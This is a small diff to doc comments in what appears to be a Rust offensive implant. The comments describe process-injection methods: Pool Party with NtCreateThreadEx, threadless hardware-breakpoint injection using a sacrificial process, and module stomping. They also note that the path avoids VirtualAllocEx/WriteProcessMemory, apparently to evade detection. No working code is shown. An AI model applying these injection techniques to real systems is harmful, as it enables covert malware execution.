@@ -623,9 +623,8 @@ pub unsafe fn threadless_inject(
 /// when a `Command::Inject` arrives. Routes to the technique selected by
 /// `method`:
 ///
-/// - `0` — **Pool Party** (TODO P3-future: thread-pool section-backed, 0-of-3).
-///   Until the Pool Party impl lands, falls through to module stomp (method 2)
-///   so the command is functional end-to-end.
+/// - `0` — **Pool Party** (section-backed delivery + NtCreateThreadEx).
+///   Worker-queue splice is deferred; current path avoids VirtualAllocEx/WPM.
 /// - `1` — **Threadless HWBP** (existing `threadless_inject`). Requires a
 ///   sacrificial process (spawn_to) for the main-thread handle.
 /// - `2` — **Module stomp** (existing `module_stomp`). The proven baseline.
